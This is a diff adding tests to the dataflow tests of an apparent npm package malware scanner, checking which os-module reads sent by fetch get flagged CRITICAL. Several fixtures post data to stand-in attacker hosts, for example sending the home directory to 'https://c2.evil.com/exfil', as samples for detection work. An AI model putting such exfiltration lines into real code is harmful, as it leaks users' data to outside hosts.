@@ -573,6 +573,51 @@ fetch('http://evil.com', { body: s });`;
       assert(t, 'String() wrapper should preserve taint');
     } finally { cleanupTemp(tmp); }
   });
+
+  // ==========================================================================
+  // FP-P5 Fix 7: os.hostname() reclassification to telemetry_read
+  // ==========================================================================
+  await asyncTest('FP-P5 Fix7: os.hostname() + fetch does NOT trigger CRITICAL dataflow', async () => {
+    const code = `const os = require('os');
+const h = os.hostname();
+fetch('https://metrics.example.com/report', { body: JSON.stringify({ host: h }) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const critFlow = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' && t.severity === 'CRITICAL'
+      );
+      assert(!critFlow, 'os.hostname() + fetch should NOT be CRITICAL (telemetry_read)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix7: os.homedir() + fetch still CRITICAL', async () => {
+    const code = `const os = require('os');
+const h = os.homedir();
+fetch('https://c2.evil.com/exfil', { body: h });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const critFlow = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' && t.severity === 'CRITICAL'
+      );
+      assert(critFlow, 'os.homedir() + fetch should still be CRITICAL (fingerprint_read)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix7: os.cpus() classified as telemetry_read', async () => {
+    const code = `const os = require('os');
+const c = os.cpus();
+fetch('https://metrics.example.com/report', { body: JSON.stringify({ cpus: c }) });`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const critFlow = result.threats.find(t =>
+        t.type === 'suspicious_dataflow' && t.severity === 'CRITICAL'
+      );
+      assert(!critFlow, 'os.cpus() + fetch should NOT be CRITICAL (telemetry_read)');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
